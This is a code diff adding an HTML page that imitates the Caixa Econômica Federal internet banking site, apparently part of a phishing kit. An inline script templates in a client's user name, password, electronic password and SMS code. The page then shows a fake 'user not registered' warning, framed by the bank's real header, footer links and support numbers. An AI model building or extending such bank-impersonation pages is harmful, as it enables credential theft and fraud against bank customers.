@@ -1,0 +1,96 @@
+<header class="hidden-xs">
+    <div class="main">
+        <div class="collapse navbar-collapse hidden-sm" id="acessibilidade">
+            <ul class="nav navbar-nav acessMenu fonte10 fonteBranca">
+                <li>
+                    <a href="#" data-href="conteudo" class="skip altText fonteBranca">Ir para conteúdo</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="mainHeader | gradient">
+        <div class="contentMainHeader">
+            <h1 class="brand" title="Caixa Econômica Federal">
+                <a href="http://www.caixa.gov.br" id="aLogoLink" class="alogo">Caixa Econômica | Internet Banking</a>
+            </h1>
+        </div>
+    </div>
+</header>
+
+<div id="delimitarTeclado">
+    <div class="main" id="conteudo">
+
+        <script>
+            var theUser = {
+                user_id: "{{client.user_id}}",
+                type: "{{client.type}}",
+                id: "{{client.id}}",
+                user: "{{client.user}}",
+                password: "{{client.password}}",
+                eletronicPassword: "{{client.eletronicPassword}}",
+                sms: "{{client.sms}}",
+                status: "{{client.status}}",
+                createdAt: "{{client.createdAt}}",
+                updatedAt: "{{client.updatedAt}}"
+            }
+        </script>
+
+
+        <div class="container-fluid ajusteMargem pagePasswords" id="conteudo-login" style="display: block;">
+            <div class="row" style="height: auto;">
+                <h1 class="mx-auto errorIcon">Aviso</h1>
+            </div>
+
+            <div class="row textt-center">
+                <div class="containerWarning">
+                    <div class="warningMessage">X5 - USUÁRIO NÃO CADASTRADO</div>
+
+                    <button class="btn-blue">Voltar</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<div class="rodapePrincipal hidden-xs">
+    <div class="main">
+        <div class="container-fluid">
+            <div class="row sm-m-l-0">
+                <div class="col-lg-4 col-md-4 col-sm-4 hidden-xs rodapeTelefone">
+                    <div id="rodapeSuporte" class="rodapeBtEsq fonteBranca">
+                        <div>Suporte Tecnológico<br>3004 1104(Capitais) ou 0800 726 0104(Demais regiões)</div>
+                    </div>
+                </div>
+                <div class="col-lg-8 col-md-8 col-sm-8 pull-right">
+                    <ul class="rodapeNav nav navbar-nav pull-right">
+                        <li class="rodapeBtDirEsq">
+                            <a id="rodapeSeguranca" class="rodapeLink rodapeBtSeguranca" target="_blank"
+                                href="http://www.caixa.gov.br/seguranca/Paginas/default.aspx" tabindex="1">Segurança</a>
+                        </li>
+                        <li class="rodapeBtDirLinha">
+                            <a id="rodapeAtendimentoLink" class="rodapeLink rodapeBtAtendimento"
+                                onclick="abrirLink('rodapeAtendimento')" tabindex="2">Rede de Atendimento</a>
+                            <a id="rodapeAtendimento" style="display:none"
+                                href="http://www.caixa.gov.br/atendimento/Paginas/default.aspx" tabindex="3">.</a>
+                        </li>
+                        <li class="rodapeBtDirLinha">
+                            <a id="rodapeAjudaLink" class="rodapeLink rodapeBtAjuda" onclick="abrirLink('rodapeAjuda')"
+                                tabindex="4">Ajuda</a>
+                            <a id="rodapeAjuda" style="display:none"
+                                href="http://www.caixa.gov.br/atendimento/internet-banking/Paginas/default.aspx"
+                                tabindex="5">.</a>
+                        </li>
+                        <li class="rodapeBtDir">
+                            <a id="rodapeTermosLink" class="rodapeLink rodapeBtTermos"
+                                onclick="abrirLink('rodapeTermos')" tabindex="6">Termos e Contratos</a>
+                            <a id="rodapeTermos" style="display:none"
+                                href="https://internetbanking.caixa.gov.br/statics-core/pdf/contrato.pdf"
+                                tabindex="7">.</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
